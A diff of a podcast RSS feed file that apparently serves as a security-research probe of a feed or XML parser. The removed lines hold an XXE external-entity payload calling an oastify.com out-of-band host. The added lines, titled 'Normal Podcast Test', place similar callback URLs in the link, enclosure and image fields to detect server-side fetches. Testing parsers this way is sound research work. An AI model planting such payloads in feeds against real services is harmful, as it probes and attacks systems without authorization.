@@ -1,20 +1,13 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rss [
-  <!ENTITY % xxe SYSTEM "http://5nsaygrlrpsi121a7xapgb805rbizbn0.oastify.com/">
-  %xxe;
-]>
 <rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
   <channel>
-    <title>Apple Security Research</title>
-    <link>https://nbvvcghvhjjkgh.github.io/applle-poc/</link>
-    <language>en-us</language>
-    <itunes:author>Youssef</itunes:author>
-    <itunes:summary>Testing XML Parser for OOB Interaction</itunes:summary>
-    <description>Research</description>
+    <title>Normal Podcast Test</title>
+    <link>https://hl6mxsqxq1ru0e0m6991fn7c43auypme.oastify.com/main</link>
+    <description>Just a normal podcast</description>
     <item>
       <title>Episode 1</title>
-      <enclosure url="https://nbvvcghvhjjkgh.github.io/applle-poc/test.mp3" length="1024" type="audio/mpeg"/>
-      <guid>12345</guid>
+      <enclosure url="hl6mxsqxq1ru0e0m6991fn7c43auypme.oastify.com/audio.mp3" length="1024" type="audio/mpeg"/>
+      <itunes:image href="https://hl6mxsqxq1ru0e0m6991fn7c43auypme.oastify.com/image.jpg"/>
     </item>
   </channel>
 </rss>
